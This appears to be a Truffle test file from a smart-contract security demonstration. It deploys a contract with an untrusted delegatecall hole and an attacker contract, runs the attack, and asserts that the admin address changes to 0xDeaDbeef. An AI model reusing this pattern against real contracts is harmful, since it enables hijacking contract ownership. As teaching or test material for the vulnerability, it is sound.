const UntrustedDelegatecall = artifacts.require("UntrustedDelegatecall");
const UntrustedDelegatecall_Attacker = artifacts.require("UntrustedDelegatecall_Attacker");

let vulnerable, attacker;

contract("UntrustedDelegatecall", () => {
	it("deploys the contracts", async () => {
		vulnerable = await UntrustedDelegatecall.deployed();
		attacker = await UntrustedDelegatecall_Attacker.deployed();
	});

	it("checks the zero admin address", async () => {
		const admin = await vulnerable.admin();
		assert.equal(admin, "0x0000000000000000000000000000000000000000");
	});

	it("performs the attack", async () => {
		await vulnerable.delegate(
			attacker.address,
			web3.eth.abi.encodeFunctionSignature("changeAdmin()")
		);
	});

	it("checks the updated admin address", async () => {
		const admin = await vulnerable.admin();
		assert.equal(admin, "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF");
	});
});
